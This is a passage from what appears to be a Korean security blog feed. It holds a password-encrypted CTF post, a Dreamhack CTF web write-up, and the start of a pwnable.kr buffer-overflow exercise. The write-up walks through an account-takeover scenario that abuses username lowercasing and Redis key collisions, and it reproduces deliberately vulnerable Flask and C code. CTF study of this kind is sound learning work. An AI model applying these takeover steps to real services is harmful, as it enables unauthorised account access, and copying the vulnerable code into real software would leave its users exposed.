ff1995a3869d9c15adb40b4b18d087c570d3e442ac04094567036d5795cc8e0c56db3c4e9f270291ce02ab46dc35c7a4368e63e88c5e77cf94a6f30560c2bf04802c66a412963fab414b335d16b02ee7f35a2ad4bf856b7976bd26058d889f14b60b92ae0551e53d42f41295f5e5f2460e4f0f8a7093a5d9460e312cde0764972ae8ef273c7679cf5b70a8ae54f728bc694de5ef2fc0e450f5ba0f014d27528bda70d4fcfdebb0732533b2ee4936910bb3b7fa8bad7cba4060afbd45fab8a84658de65c321013ba3bf75d5173edbeed5e2a6810d43624331fe557f222027278199d233dc3437d1b140cc4e3a5f8b829ee9acc36cad7241af127f30d53c1fc1a2f7e5e3ef896edebc965aa1514acf929759979decc2e9f409361c41c5ffdc580851005446c981f81d737d391463c398f5b2e3213b57bb6f56842c2623543e54dc3d8ced50373830d917051889ce940170deed46fbad5097ba8a679142e2e931d077f8f1caa3069b87bf622d0f245d6b337af39b2471e5ab670ce33f19628479f6aadf5a2649df05e861dcf148efb3208d726427ad6025185f858cf7438d6188a033cf36e7a212bd15f84430de6f9da7df064024f1012b26d3e35fc93fe6b5b447086f658fbcbbad4eaa17152baf6ea341688b768d8df839e8d7da7c9a87528764d7bef9b084944897114aafa737c2643074eab439ce99ba579e3597b742f79ec6e48137cbaf251b32dd6979ba0bfd58955c1568e5a3c5a9d15fa70ca844a9a741adc93a1a05d938c550ce388cc2a10efda40bb91bbc75507f252ca6c4a305824e01cfb6859cdb67eed6fbe846881284b5dfb1f17b816055283c881917a8572019715faf4be9022340a2f4461b0cc0cd6620a6ab56387bc82e275434d2e306f9029d13e67e1b616f59c69bc495100a883c4be97712d1397cd929179517a117f52c4a449dcc1ff749121b5ef7c94bc7d118841fad056dd2f0de5be55f80b68e48b8351f61ade2d0bef2897d3f658c3d267d8f159bdf066bb6b074d7dbf68f91022863ed3db37e682bd1cc7ad8a932194c1cae418de8889bce64f5cd452802f3fbd1a7f03e8a10867f967a3695640571f19349fb2695d760e27e01545075ecf91e00d47f24c1228b8968e8ad34ec30c7f44900ef10fc19768ee825863d2ef0b900d05fc01c82f76d7b2e186d7f7120517df8d96c451cfdf6b1a06b41afdaffcffc75fcacb9adaac2e67b96f41e49e1dc82c44b7c4e9b68a4ca1d3365d78a7b16e1b62e16090b9cb18852cfa585a50290883100fb6833033f0c9cc51cce53eb9cfad5020fc1a8dcf818ed00681851cafe6d8c294b3e723f4f41b5b4860db7945fd2f3f922ff55fc89b6598dcd908d87e22fdbdaf655880a62a049f71f90ba93a4e630ebdec31315c743d91bfff99f5a05626cb2a7d57f7406affa0b09334de4dd547b9596cc3edc50371d52a6b32bbe8ecb528e0ace2248834d6e7e6282d5fe2a2bae8ddbe287527ca1978e649f457dc5e80f86f877461bf83e8b22f6d3881071c2be3a5a70fb39a7509a4755218223e952aa14e959f33acacb69bafc110bc12e1b9edbca615726012428e8996eeca3aeb7178f6190ceeb78c2d99248c52d62873e55104ff4f1176a7c42feef95e6d6330b8542b05bb27dd5e49f685991c8266d645db70abb4285ae2c7d0c432bb56afae11f13f237666277f86f3e69fc1e4291914f92e27205f348cd2836ccabfe4d59514a8d740fff9df943b65d6ce369e36c11719bb333e263cad15ee150a01f712dbb0315f8c0e40ca544383992df4878c7f86338ecfbb219779b11bf3d3b377af07ca1be01d22e7da42356a23b576ad5a20c7a537ac467708b053d38d74d9e81037df693d3f73eb21639180c595c06faf9ca481383bc61f0c0e703092d5b3f61420ae57b6fb764aafb6e4c4d5f4ea80ccf058b42e3097de9c00d6eee23d573581a74772443cfebe1d89abc3b2d2cbe219789db0b89c6bd1f261970ca3c63b95234704a0ef1e0d7029f07ba420f024064c2dafd1a411513d61958b1ab9f6fc73232289d3549981f62d0429b78dac95019e1b9cf05ad6b73046d2eca62c0ce27d51f016d68c100e962a76cd3b5a3ca555440a63041d7abe1e1725ea179397ba9f57908a41e85302b0e4df816197a3592449046ab1a65b487e59bdf7e5064f9bcbf0a5cce1910d14cf5837dac418e832be17fa5d524461b5672a3b29ffe7d021a857d253e308a6ee8efe9cc33e6d299bb2adcf0977923dcd2aa283a15a058eb1eb3c5bedf713777d876bdb2f7b385c2877c06759eff417dd8b310de54ced93127d90f7a360e6435ea0b9efeb2b0a4624ae2e18fb41e5f39c5971de21472140df5d1ac05fcb8c9382e0770273f40cf94fdbf7b219914f28290608cada46067f4e4b920fa95dde7d85bd1265480a66b379dad9c95e53f178f4209347c021ec7d2c7cd71c83c09277f3ff255e0fc3147014eaebcd9e2b723e4013e94ec3f589f50901b1fc742fbe9b13306eff6d9f4f9e2ed9d09917f62d896c93bac61268fe830c577100c317a5199c28c417d5f23fa32d62d9ea60fcae4ff5e2f3c18e1b08d0a8952e399e9b04b1ca3186bafd700ea60e166b7bebdbd2593c0bc6c16ffe2ce7bc4868ea15d7fb3ec1b92dc6298af342a5181d49eedc7295e3e839ce7536604094e76ee00730e6e91738a7a24a6991ac7c67d93e0d4e37105e379170d223c9024540ad301971fc9eca9fb45cc1058050454292f484415cecf572ac7daad1f6747b1c8ad7ba6a48c4f990c1f7738a3587ff3e95df425c964fb458f25a6cbda57755dd75106ea724cbb0c53566ddca28fc1727dd17695440acb8847443992c6b9dd92651b5929435b5bae5e008587cd0dab90218bdf3fdf1c298ad8fee8e9b0d27db0899f2c1d47775e0e5251534a4862e633b81449c82c633e4b5a36276422570bc8f6aa568a7bda9c83ad7aff2f680ed1cc08d3551999185319a75219715b06de09ecf1c9fdd51335306a4884ef3fd13ea83d89b72e4b7f04c4623aa63d088f749a02892fe9fe549d123910ac1e67924e429e859d8af2a158347936379af0cd2b21a84cecdbefc7c91fdd2e6ddd4b0c94fb244ebb6b425de2c58edd6e7823bca31f5fc45733304314e8048de82349a548ef54720c98240e20058229e7ae40b47833e1b30af0a2d86fb1a0bb23d717070ce2796e68de711ac77fdd8cfe7303785de5d7faca6775611ee70094f1e3d06a85f452c604d15b09c1937c637a6f78f83226c00fd38ed754676b6dfbfebe09a69b30129c97b8dee823ff044df3e11848b2901ff744b75db1abc5afa37b09d5bb8fd109c04fa5b38f9574cf5ecd99488815f93de87a1a210ad4e5457683e857ea658582543520040eb51b407c3e5feced801d5211551dba6ef3150cf1bf1df787118a036d8093cd866b6a409b87c3bb94775b90fbe8c8db5bbcee4abbb80af9cdb76b86dc2e19dece3725828bf683f8c4b6ad18f3c861638b24f4741302be1c50e694227f5fa57573d22c53811b48fd3c59cf2672b50f94451a8b562d947c004637ee79eafb1fb3d8a23f092081d65f71a67871e92046d20d111037b542ec7072aab39998fea8693e24bf510338154555050d7fa6cd577e7e22b60ce97517a0f9f123b683ea22c4ae62728d33bc906f08aadd6a170ca1437779cb6b02e0ffa0410f12adcceae0285bd8496d0c3132125a3d73bd6eb4d4ac6154e001ac4bc621b01617a6b8ae68b938c05b4c9dcd372c249c98632f8597aed866909de9039e04d0d093fefe817dae4fca99a90bd5ff3adab6b533593d9848ea7b8c0bdef9e2d467b347b6a3ff466d4debfda3768c6d557176a8ec7ddad5af41b6c3e0bd5332159fa2df553b36ee47425a01047f57207c5d6990039a9bc4e3ed191d247de266a0b7ccb64904d58e645226c13496704b6a865a2b3a254691bfa481073c5d953092b932fd65427bf83cb50d03523a13faae116328f6a34dbb569351a2fcaf1cc88e90cda301326e462a9634a541d5ae2f291f84ed95f2f9956e41ecd5c08103b304382f17138dd571ae0a033e524873393ba0d8af8ab6bf89db54f719451cab0baa938b136bfd80b8a09a3751577112e901fd46147cb5a1aa927c3f7605427628e5a4c9d597b934700a9f4741e17a5d7ca56525b9cca106639304c2b167998289dd2e4e4833a1f392485cdcbc52fba037038a9fa1ee2f7279c9216f32fb63db0ad6ca14a11648d6d198bd3fa8ef52b27ec1166a31668215e9b89c5facd444e5d9ef851aea7306cd2f6e078c7f2a1111c4f027d80b36e56bfb0ead7579b0d7ab976f38f9fac4c2bc101491368a3154fd39b459bf8eb2473fdf2531897b244b69d56a45ac981692f17c2c88cb30ff639bb6da0954f2c888b6d4ab59421208d4fc58bd230399b7e676ac8a6be9db327927d2e73a4a768bf46fa3b2effff64b3edd9fe391170eded6d957d7e1000d3bffd17470f39eba62f4667e87c30b8e876c6baf073738da284e3bb4ae2bf96d509a7f731336c70cb37772e07a807d7c7cd5e2d15e8332423ffc38fe277f3358f59c4f7de23ad3f28ea1e124b8aa97d206cd35fd320e8e02c6e40484789df0529c8856dcf3437c6eaac6dadd253feba60b37139eb15d28f782a7e3b8ca8e7a58d2b5225a8e6a5072506d752921fef0175da2be270f25e9572fef8f937dfbab07945454caa799bf629145488f5cedf84bdbd11291eaf9e8beee83e1d0d791b4c0bb6c075364ef3f6e75bd89deb0447435560aed3313bdb24b14b54bd211775311634c779eda8f29eff9db8f3830c9e1af8a76f28296b4a49307397ae8254e70ffea434e296fd64c1b0820ab39496a6366394ac88b0a9542cc6fd09b8387113445d3c0c6be75e322cd91dab7b3cb11a04111dd88bf29fbadcad37cc2088dc31a8c353da28f50da4ef44a475f369ed678982b726bac829332e7a657ed9e664d331a0a1b6133f4c1ec64fc447485f305ade62a0c7ea47ede8ba3c99aea299d2e6bee87bf</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> XXE </tag>
            
            <tag> LFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dreamhack CTF Season 1 Round #4 Write Up</title>
      <link href="2021/01/30/2021-01-30-dctf/"/>
      <url>2021/01/30/2021-01-30-dctf/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image2/blob/main/dctf10th.png?raw=true"></p><p>2021년 1월 30일 오전 9시부터 오후 6시까지 Theory에서 CTF를 주최하였습니다. 이번 대회는 전체적으로 난이도가 낮아 운이 좋게 10등을 할 수 있었고, 풀면서 그나마 공을 들였던 <code>WEB_2021A_Medium</code>라는 문제의 Write Up을 작성해보겠습니다.<br></p><h2 id="Web-WEB-2021A-Medium-936-pts"><a href="#Web-WEB-2021A-Medium-936-pts" class="headerlink" title="(Web) WEB_2021A_Medium [936 pts]"></a>(Web) WEB_2021A_Medium [936 pts]</h2><blockquote><p>WEB_2021A_Medium 문제는 관리자 계정으로 로그인하고, 관리자 계정을 활성화 한 후에 FLAG를 읽는 문제입니다.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>)</span><br><span class="line">    myusr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">    <span class="keyword">if</span> myusr.userid == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> myusr.auth:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, flag=FLAG)</span><br><span class="line">    <span class="keyword">return</span> alert(<span class="string">&quot;No Flag&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/flag</code>를 보면 현재 로그인된 사용자가 <code>admin</code>이고, 계정이 활성화가 되어 있으면 <code>FLAG</code>를 보여주는 것을 볼 수 있습니다. 그럼 관리자 계정을 획득하고, 계정을 활성화 시켜보겠습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    userid = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    email = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    auth = db.Column(db.Boolean())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, userid, password, email</span>):</span></span><br><span class="line">        self.userid = userid</span><br><span class="line">        self.password = password</span><br><span class="line">        self.email = email</span><br><span class="line">        self.auth = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_json</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;userid&quot;</span>: self.userid.lower(),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: self.password.lower(),</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: self.email.lower(),</span><br><span class="line">            <span class="string">&quot;auth&quot;</span>: self.auth,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/signin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span>():</span></span><br><span class="line">    <span class="keyword">if</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Already Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;signin.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        userid = request.form.get(<span class="string">&quot;userid&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        userpw = request.form.get(<span class="string">&quot;userpw&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        usr = User.query.filter_by(</span><br><span class="line">            userid=userid, password=hashlib.md5(userpw.encode()).hexdigest()</span><br><span class="line">        ).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(usr, <span class="string">&quot;userid&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Check userid or userpw&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>로그인 로직을 보면 userid, userpw 값을 받아와서 로그인하는 것을 볼 수 있습니다. 여기서 session을 관리 할 때 to_json 함수를 이용해서 사용자 정보를 넣어주는 것을 볼 수 있습니다. to_json 함수를 보면 userid의 값을 lower 함수를 이용해 소문자로 만들어 세션으로 사용하는 것을 볼 수 있습니다. 즉, <code>ADMIN</code>이라는 사용자를 가입해서 로그인을 해주면 to_json 함수에 의해서 <code>admin</code>으로 로그인이 됩니다. 이를 통해 관리자 아이디는 쉽게 획득했습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Auth</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, email</span>):</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">        self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self</span>):</span></span><br><span class="line">        setcount = conn.get(self.email)</span><br><span class="line">        <span class="keyword">if</span> setcount:</span><br><span class="line">            setcount = <span class="built_in">int</span>(setcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            setcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> setcount &lt; <span class="number">5</span>:</span><br><span class="line">            self.random_key = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">111111</span>, <span class="number">999999</span>):04d&#125;</span>&quot;</span></span><br><span class="line">            conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.email, setcount)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        getcount = conn.get(self.getcount_key)</span><br><span class="line">        <span class="keyword">if</span> getcount:</span><br><span class="line">            getcount = <span class="built_in">int</span>(getcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            getcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> getcount &lt; <span class="number">5</span>:</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, getcount)</span><br><span class="line">            <span class="keyword">return</span> conn.get(self.emailauth_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> auth.<span class="built_in">set</span>():</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> send_mail(email, auth.random_key):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">f&quot;Send Email To <span class="subst">&#123;email&#125;</span>&quot;</span>, <span class="string">&quot;/email_verify_chk&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Send Email Err&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify_chk&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify_chk</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify_chk.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        authcode = auth.get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> authcode:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth or No Code Generated&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = request.form.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> code == authcode:</span><br><span class="line">                usr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">                usr.auth = <span class="literal">True</span></span><br><span class="line">                db.session.commit()</span><br><span class="line">                session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;AUTH!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;Check Code&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/email_verify</code>는 보면 현재 사용자의 이메일로 인증 번호를 생성하는 로직입니다. 코드를 보면 현재 사용자의 이메일을 Auth 클래스의 인자로 넘겨주며 클래스를 생성하고, set 함수를 이용해서 인증 코드를 생성해서 디비에 저장하고 있는 것을 볼 수 있습니다.<br></p><p><code>/email_verify_chk</code>는 인증 번호를 입력 받고, 디비에 저장되어 있는 값과 비교해서 참이면 활성화를 해주고, 거짓이면 그대로 비활성화로 있습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.email = email</span><br><span class="line">self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">conn.<span class="built_in">set</span>(self.email, setcount)</span><br></pre></td></tr></table></figure><p>위 코드를 보면 email 값을 이용해서 email, emailauth_key, getcount_key 값을 만들고, 이를 redis의 키로 사용하는 것을 볼 수 있습니다. 그리고 emailauth_key가 실제로 입력 받은 인증 번호와 비교를 하는 값 입니다. 하지만 우리는 이 값을 알아낼 수는 없지만 로직을 이해하고 있다면 쉽게 우회할 수 있습니다. 해당 로직에 대한 내용은 <a href="https://dreamhack.io/learn/29#t209">드림핵 강의</a>에서 자세하게 다루고 있습니다. 이번 로직은 설명하기 귀찮고, 그냥 글을 보는 게 좋을 거 같습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li><code>ADMIN</code>으로 회원 가입을 하고, <code>ADMIN</code>으로 로그인을 해서 관리자로 로그인을 한다.</li><li><code>auth:admin</code>인 사용자를 하나 더 만들어서 로그인을 한 후에, 인증 코드를 받는다.</li><li>(2)번 시나리오에서의 로직 때문에 관리자가 <code>/email_verify_chk</code>에서 <code>입력 받은</code> 인증 코드와 비교되는 인증 코드가 1로 바뀐다.</li><li>관리자에서 인증 코드를 1을 보내주면 관리자 게정이 활성화된다. </li><li>이제 FLAG를 읽으면 된다.<br></li></ol><p>위 내용은 그냥 링크 달아준 드림핵 강의를 한 번 보면 이해가 가실 겁니다.<br></p><blockquote><p>FLAG : DH{3cd6941075580d889519fcf1bd422bd1}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REDIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable Exploitation</title>
      <link href="2021/01/25/2021-01-25-pwn/"/>
      <url>2021/01/25/2021-01-25-pwn/</url>
      
        <content type="html"><![CDATA[<p><strong>앞 전에 포너블을 공부를 조금하다가 다시 안 했는데 오늘부터 다시 하루마다 포너블 문제를 조금씩 풀어보려고 합니다.</strong><br></p><hr><h2 id="PWN-D-1-2021-01-25"><a href="#PWN-D-1-2021-01-25" class="headerlink" title="PWN D+1 (2021.01.25)"></a>PWN D+1 (2021.01.25)<br></h2><hr><p>Pwnable.kr Challenge : BOF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">        gets(overflowme);       <span class="comment">// smash me!</span></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>처음 풀어 볼 문제는 Pwnable.kr의 BOF라는 문제입니다. func 함수를 보면 key의 값이 <code>0xcafebabe</code>이면 system 함수를 호출하는 것을 볼 수 있습니다. BOF를 이용해서 key 값을 <code>0xcafebabe</code> 바꿔주면 될 거 